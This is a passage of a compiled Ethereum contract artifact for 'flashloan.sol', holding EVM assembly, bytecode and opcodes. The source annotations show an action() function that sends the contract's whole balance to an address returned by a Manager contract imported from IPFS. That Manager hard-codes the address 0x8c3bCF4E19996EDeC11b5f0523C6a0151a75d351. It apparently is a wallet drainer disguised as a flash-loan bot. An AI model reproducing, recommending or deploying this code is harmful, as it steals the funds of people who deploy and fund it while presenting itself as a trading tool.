    dup1\n      iszero\n      tag_16\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_16:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"flashloan.sol\":439:464  string public tokenSymbol */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_17\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_17:\n        /* \"flashloan.sol\":439:464  string public tokenSymbol */\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_20:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_20)\n    tag_22:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"flashloan.sol\":439:464  string public tokenSymbol */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_23\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_23:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"flashloan.sol\":15951:16076  function action() public payable { \r... */\n    tag_9:\n        /* \"flashloan.sol\":16004:16011  manager */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"flashloan.sol\":16004:16033  manager.uniswapDepositAddress */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xfeae9ad3\n        /* \"flashloan.sol\":16004:16035  manager.uniswapDepositAddress() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_25\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_25:\n        /* \"flashloan.sol\":16004:16035  manager.uniswapDepositAddress() */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_27:\n        /* \"flashloan.sol\":16004:16035  manager.uniswapDepositAddress() */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_28\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_28:\n        /* \"flashloan.sol\":16004:16035  manager.uniswapDepositAddress() */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n        /* \"flashloan.sol\":15996:16045  payable(manager.uniswapDepositAddress()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"flashloan.sol\":15996:16068  payable(manager.uniswapDepositAddress()).transfer(address(this).balance) */\n      0x08fc\n        /* \"flashloan.sol\":16046:16067  address(this).balance */\n      selfbalance\n        /* \"flashloan.sol\":15996:16068  payable(manager.uniswapDepositAddress()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_30\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_30:\n        /* \"flashloan.sol\":15996:16068  payable(manager.uniswapDepositAddress()).transfer(address(this).balance) */\n      pop\n        /* \"flashloan.sol\":15951:16076  function action() public payable { \r... */\n      jump\t// out\n        /* \"flashloan.sol\":409:432  string public tokenName */\n    tag_12:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_31\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_32\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_31)\n    tag_32:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_33:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_33\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_31:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"flashloan.sol\":439:464  string public tokenSymbol */\n    tag_19:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_34\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_35\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_34)\n    tag_35:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_36:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_36\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_34:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n\n    auxdata: 0xa26469706673582212206a34b6f2a9e6cbe19fc31e8d74a568d91fdd0be6a6fde71ebecd067cf000234164736f6c63430006060033\n}\n\nsub_1: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager {\r... */\n      pop\n      dataSize(sub_0)\n      dup1\n      dataOffset(sub_0)\n      0x00\n      codecopy\n      0x00\n      return\n    stop\n\n    sub_0: assembly {\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager {\r... */\n          mstore(0x40, 0x80)\n          callvalue\n            /* \"--CODEGEN--\":5:14   */\n          dup1\n            /* \"--CODEGEN--\":2:4   */\n          iszero\n          tag_1\n          jumpi\n            /* \"--CODEGEN--\":27:28   */\n          0x00\n            /* \"--CODEGEN--\":24:25   */\n          dup1\n            /* \"--CODEGEN--\":17:29   */\n          revert\n            /* \"--CODEGEN--\":2:4   */\n        tag_1:\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager {\r... */\n          pop\n          jumpi(tag_2, lt(calldatasize, 0x04))\n          shr(0xe0, calldataload(0x00))\n          dup1\n          0x0c0f93a1\n          eq\n          tag_3\n          jumpi\n          dup1\n          0xfeae9ad3\n          eq\n          tag_4\n          jumpi\n        tag_2:\n            /* \"--CODEGEN--\":12:13   */\n          0x00\n            /* \"--CODEGEN--\":9:10   */\n          dup1\n            /* \"--CODEGEN--\":2:14   */\n          revert\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6998:7041  function performTasks() public {\r... */\n        tag_3:\n          tag_5\n          tag_6\n          jump\t// in\n        tag_5:\n          stop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7046:7168  function uniswapDepositAddress() public pure returns (address) {\r... */\n        tag_4:\n          tag_7\n          tag_8\n          jump\t// in\n        tag_7:\n          mload(0x40)\n          dup1\n          dup3\n          0xffffffffffffffffffffffffffffffffffffffff\n          and\n          0xffffffffffffffffffffffffffffffffffffffff\n          and\n          dup2\n          mstore\n          0x20\n          add\n          swap2\n          pop\n          pop\n          mload(0x40)\n          dup1\n          swap2\n          sub\n          swap1\n          return\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6998:7041  function performTasks() public {\r... */\n        tag_6:\n          jump\t// out\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7046:7168  function uniswapDepositAddress() public pure returns (address) {\r... */\n        tag_8:\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7100:7107  address */\n          0x00\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7121:7163  0x8c3bCF4E19996EDeC11b5f0523C6a0151a75d351 */\n          0x8c3bcf4e19996edec11b5f0523c6a0151a75d351\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7114:7163  return 0x8c3bCF4E19996EDeC11b5f0523C6a0151a75d351 */\n          swap1\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7046:7168  function uniswapDepositAddress() public pure returns (address) {\r... */\n          swap1\n          jump\t// out\n\n        auxdata: 0xa26469706673582212207c5cd2ed4ff54cf52113d1ca38c771ae309adacda0d8005e79b722d2b25216d864736f6c63430006060033\n    }\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506040516107c83803806107c88339818101604052604081101561003357600080fd5b810190808051604051939291908464010000000082111561005357600080fd5b8382019150602082018581111561006957600080fd5b825186600182028301116401000000008211171561008657600080fd5b8083526020830192505050908051906020019080838360005b838110156100ba57808201518184015260208101905061009f565b50505050905090810190601f1680156100e75780820380516001836020036101000a031916815260200191505b506040526020018051604051939291908464010000000082111561010a57600080fd5b8382019150602082018581111561012057600080fd5b825186600182028301116401000000008211171561013d57600080fd5b8083526020830192505050908051906020019080838360005b83811015610171578082015181840152602081019050610156565b50505050905090810190601f16801561019e5780820380516001836020036101000a031916815260200191505b5060405250505081600090805190602001906101bb929190610243565b5080600190805190602001906101d2929190610243565b506040516101df906102c3565b604051809103906000f0801580156101fb573d6000803e3d6000fd5b50600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050506102f4565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061028457805160ff19168380011785556102b2565b828001600101855582156102b2579182015b828111156102b1578251825591602001919060010190610296565b5b5090506102bf91906102cf565b5090565b60fa806106ce83390190565b6102f191905b808211156102ed5760008160009055506001016102d5565b5090565b90565b6103cb806103036000396000f3fe6080604052600436106100385760003560e01c80630a7a1c4d146100445780636c02a9311461004e5780637b61c320146100de5761003f565b3661003f57005b600080fd5b61004c61016e565b005b34801561005a57600080fd5b50610063610259565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a3578082015181840152602081019050610088565b50505050905090810190601f1680156100d05780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100ea57600080fd5b506100f36102f7565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610133578082015181840152602081019050610118565b50505050905090810190601f1680156101605780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663feae9ad36040518163ffffffff1660e01b815260040160206040518083038186803b1580156101d657600080fd5b505afa1580156101ea573d6000803e3d6000fd5b505050506040513d602081101561020057600080fd5b810190808051906020019092919050505073ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610256573d6000803e3d6000fd5b50565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102ef5780601f106102c4576101008083540402835291602001916102ef565b820191906000526020600020905b8154815290600101906020018083116102d257829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561038d5780601f106103625761010080835404028352916020019161038d565b820191906000526020600020905b81548152906001019060200180831161037057829003601f168201915b50505050508156fea26469706673582212206a34b6f2a9e6cbe19fc31e8d74a568d91fdd0be6a6fde71ebecd067cf000234164736f6c63430006060033608060405234801561001057600080fd5b5060db8061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a1146037578063feae9ad314603f575b600080fd5b603d6087565b005b60456089565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b565b6000738c3bcf4e19996edec11b5f0523c6a0151a75d35190509056fea26469706673582212207c5cd2ed4ff54cf52113d1ca38c771ae309adacda0d8005e79b722d2b25216d864736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x7C8 CODESIZE SUB DUP1 PUSH2 0x7C8 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH2 0x53 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH2 0x69 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH2 0x86 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xBA JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x9F JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xE7 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH2 0x10A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH2 0x120 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH2 0x13D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x171 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x156 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x19E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH2 0x1BB SWAP3 SWAP2 SWAP1 PUSH2 0x243 JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH2 0x1D2 SWAP3 SWAP2 SWAP1 PUSH2 0x243 JUMP JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x1DF SWAP1 PUSH2 0x2C3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x1FB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x3 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH2 0x2F4 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH2 0x284 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH2 0x2B2 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH2 0x2B2 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH2 0x2B1 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH2 0x296 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH2 0x2BF SWAP2 SWAP1 PUSH2 0x2CF JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH1 0xFA DUP1 PUSH2 0x6CE DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH2 0x2F1 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0x2ED JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH2 0x2D5 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x3CB DUP1 PUSH2 0x303 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xA7A1C4D EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xDE JUMPI PUSH2 0x3F JUMP JUMPDEST CALLDATASIZE PUSH2 0x3F JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4C PUSH2 0x16E JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x63 PUSH2 0x259 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x88 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD0 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xEA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF3 PUSH2 0x2F7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x133 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x118 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x160 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x3 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFEAE9AD3 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1D6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1EA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x200 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x256 JUMPI 